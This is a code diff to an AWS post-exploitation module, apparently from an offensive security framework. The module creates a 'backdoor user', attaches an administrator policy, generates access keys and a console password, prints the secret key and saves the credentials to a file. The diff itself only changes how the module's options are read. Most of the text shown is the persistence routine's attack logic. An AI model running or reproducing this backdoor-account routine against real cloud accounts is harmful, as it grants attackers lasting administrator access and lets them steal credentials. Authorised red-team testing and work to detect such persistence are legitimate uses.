@@ -40,7 +40,7 @@ class Module(Post):
             print_info("=" * 80)
             
             results = {}
-            username = self.username.value
+            username = self.username
             
             print_info(f"\n[1] Creating backdoor user: {username}")
             
@@ -55,7 +55,7 @@ class Module(Post):
             
             # Attach administrator policy
             print_info(f"\n[2] Attaching administrator policy...")
-            policy_attached = self._attach_policy(username, self.policy_arn.value)
+            policy_attached = self._attach_policy(username, self.policy_arn)
             if policy_attached:
                 results['policy_attached'] = True
                 print_success("Administrator policy attached")
@@ -64,7 +64,7 @@ class Module(Post):
                 return False
             
             # Create access keys
-            if self.create_access_key.value:
+            if self.create_access_key:
                 print_info(f"\n[3] Creating access keys...")
                 access_keys = self._create_access_keys(username)
                 if access_keys:
@@ -77,8 +77,8 @@ class Module(Post):
                     print_error("Failed to create access keys")
             
             # Create login profile
-            if self.create_login_profile.value:
-                password = self.password.value
+            if self.create_login_profile:
+                password = self.password
                 if not password:
                     print_warning("Password not provided, skipping login profile creation")
                 else:
@@ -106,11 +106,11 @@ class Module(Post):
                 print_info(f"  AWS_SECRET_ACCESS_KEY={results['access_keys'].get('SecretAccessKey')}")
             
             # Save to file if requested
-            if self.output_file.value:
+            if self.output_file:
                 try:
-                    with open(self.output_file.value, 'w') as f:
+                    with open(self.output_file, 'w') as f:
                         json.dump(results, f, indent=2, default=str)
-                    print_success(f"Credentials saved to {self.output_file.value}")
+                    print_success(f"Credentials saved to {self.output_file}")
                     print_warning("⚠️  Secure this file immediately!")
                 except Exception as e:
                     print_error(f"Failed to save credentials: {e}")
